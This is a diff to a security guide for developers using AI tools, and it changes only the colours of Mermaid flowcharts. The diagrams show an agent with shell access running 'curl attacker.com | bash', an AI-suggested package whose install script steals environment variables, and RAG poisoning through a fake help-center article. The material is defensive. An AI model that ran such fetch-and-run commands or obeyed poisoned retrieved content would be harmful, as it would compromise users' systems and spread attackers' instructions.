@@ -186,7 +186,8 @@ flowchart TD
     A[Developer pastes real .env file into AI chat] --> B[Secret now stored on<br/>AI provider's servers/logs]
     B --> C[Secret is now COMPROMISED]
     C --> D[Must be rotated immediately]
-    style C fill:#ffcccc
+    style A fill:#ffcccc,color:#000000,stroke:#cc0000,stroke-width:2px
+    style C fill:#ffb3b3,color:#000000,stroke:#cc0000,stroke-width:2px
 ```
 
 ### 💡 Practical example
@@ -223,8 +224,9 @@ flowchart LR
     B --> C[Agent has full shell access]
     C --> D[Runs malicious command<br/>e.g. curl attacker.com | bash]
     D --> E[System Compromised]
-    style D fill:#ffcccc
-    style E fill:#ff9999
+    style A fill:#ffcccc,color:#000000,stroke:#cc0000,stroke-width:2px
+    style D fill:#ffb3b3,color:#000000,stroke:#cc0000,stroke-width:2px
+    style E fill:#ff9999,color:#000000,stroke:#cc0000,stroke-width:2px
 ```
 
 ### 💡 Practical example
@@ -311,7 +313,8 @@ flowchart TD
     A["AI suggests: npm install super-fast-csv-parser"] --> B{Does this<br/>package really exist<br/>and is it safe?}
     B -->|Not checked| C[Installed blindly]
     C --> D[Malicious install script runs<br/>steals environment variables]
-    style D fill:#ffcccc
+    style A fill:#ffcccc,color:#000000,stroke:#cc0000,stroke-width:2px
+    style D fill:#ffb3b3,color:#000000,stroke:#cc0000,stroke-width:2px
 ```
 
 ### 💡 Practical example
@@ -358,8 +361,8 @@ Both create a new problem: the AI's answers now depend on outside data — and o
 flowchart LR
     A[Attacker edits/adds<br/>fake help-center article] --> B[RAG system retrieves it<br/>as if it were trustworthy]
     B --> C[AI repeats the fake<br/>instruction to real users]
-    style A fill:#ffe0e0
-    style C fill:#ffcccc
+    style A fill:#ffcccc,color:#000000,stroke:#cc0000,stroke-width:2px
+    style C fill:#ffb3b3,color:#000000,stroke:#cc0000,stroke-width:2px
 ```
 
 ### 💡 Practical example
